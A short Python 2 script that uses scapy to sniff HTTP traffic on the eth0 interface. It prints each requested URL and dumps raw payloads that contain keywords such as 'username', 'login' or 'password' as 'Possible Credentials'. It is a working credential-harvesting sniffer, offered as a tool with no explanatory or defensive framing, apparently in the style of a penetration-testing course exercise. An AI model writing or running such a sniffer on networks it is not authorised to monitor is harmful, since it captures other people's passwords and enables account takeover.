
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store = False, prn = p_s_p)

def get_url(packet):
    url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    return url



def get_login(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load           
        #print load
        keywords = ["username","uname","login","Login","pass","password","user"]
        for key in keywords:
            if key in load:
                return load

def p_s_p(packet):
    if packet.haslayer(http.HTTPRequest):
        #print packet.show()
        url = get_url(packet)
        print " Http Request >> " + url
        login_info = get_login(packet)
        if login_info:
            print "Possible Credentials >> \n" + login_info + "\n\n"

try:
    sniff("eth0")
    raise KeyboardInterrupt("keyboard interruption")
except KeyboardInterrupt:
    print "Detected Ctrl+C,exiting"
